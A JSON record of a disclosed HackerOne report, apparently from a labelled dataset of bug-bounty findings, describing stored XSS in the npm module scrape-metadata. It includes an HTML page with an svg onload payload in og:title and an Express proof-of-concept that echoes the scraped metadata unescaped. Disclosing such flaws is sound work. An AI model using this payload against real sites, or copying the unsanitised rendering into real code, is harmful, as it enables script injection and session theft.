{
    "reported_to": "Node.js third-party modules",
    "reported_by": "johnssimon007 ",
    "title": "stored xss in scrape-metadata when reading metadata from an html page",
    "content": "\nHy\nModule\nscrape-metadata\nhttps://www.npmjs.com/package/scrape-metadata\nModule Description\na module used to scrape meta data contents from an article\nVulnerability Description\nIt was possible to embed malicious js code in metadata content read by scrape-metadata. When library reads such metadata, there was no sanitization performed. If output from scrape-metadata is rendered directly in HTML code,it can lead to xss/html injection.\nSteps To Reproduce:\ncreate a website, I used a local server available at http://127.0.0.1:8080\nBelow is html file with js code injected in 'og:title property' and i uploaded the file to my\nremote server http://pokegen.in/test.html\nCode 62 Bytes\n1<head>\n2    <meta charset=\"utf8\">\n3    <title>scrap-meta</title>\nCode 264 Bytes\n1    <meta property=\"og:description\" content=\"hackerone\">\n2    <meta property=\"og:image\" content=\"image\">\n3    <meta property=\"og:title\" content='https://google.com<svg/onload=prompt(1)>'>\n4    <meta property=\"og:type\" content=\"article\">\n5</head>\n6<body>\n7</body>\n8</html>\ninstall scrape-metadata\nnpm install scrape-metadata\nconst http=require('http');\nconst server=http.createServer();\nconst express=require('express');\nconst app=express();\nconst scrape = require('scrape-metadata')\nvar url = \"http://pokegen.in/test.html\";\napp.get('/scrap', function(req, res) {\nscrape(url, (err, meta) => {\nconsole.log(meta)\nlet __html = `\nCode 150 Bytes\n1               <div>\n2                   <p>site title:${JSON.stringify(meta)}</p>\n3               </div>\n4           `\n5           res.send(__html)\n6  });\n});\napp.listen(8080)\nsave this as scrap.js\nnow run the app,node scrap.js\nnow goto http://127.0.0.1:8080/scrap on browser.and you will get a javascript prompt\nSupporting Material/References:\nConfiguration I've used to find this vulnerability:\nwindows 7\nnode 8.9.3\nnpm 5.5.1\ncurl 7.54.0\n# Wrap up\nIf you have any questions about any details of this finding, please let me know in comment.\nThank you\nRegards,\njohns simon\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nThis might lead to stealing session cookies from infected website, and much more sophisticated attacks\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-site Scripting (XSS) - Stored"
    ],
    "screenshots": {},
    "disclosed_date": 1532705100,
    "report_url": "https://hackerone.com/reports/369573",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Create an HTML file with malicious JavaScript in the 'og:title' meta tag and host it on a server."
        ],
        [
            2,
            "Use the scrape-metadata module to fetch and display the metadata from the malicious HTML file without sanitization."
        ]
    ],
    "vuln_description": "The scrape-metadata module does not sanitize metadata content fetched from HTML files, allowing for stored XSS when the output is rendered directly in HTML.",
    "reason": "The vulnerability involves a straightforward exploitation of missing sanitization in a common web scraping scenario, without complex interactions or state manipulations.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "injection_metadata": {
        "is_simple_payload": true
    },
    "authnz_metadata": {
        "reason": "The vulnerability involves stored XSS in metadata content read by scrape-metadata, which is a client-side issue rather than an authentication or authorization flaw. The proposed methodologies focus on AuthN/AuthZ and IDOR vulnerabilities, which are server-side issues involving user sessions and resource access control. The XSS vulnerability does not fit into these categories as it does not involve crossing authorization boundaries or manipulating resource access with different user sessions.",
        "is_detectable": false
    }
}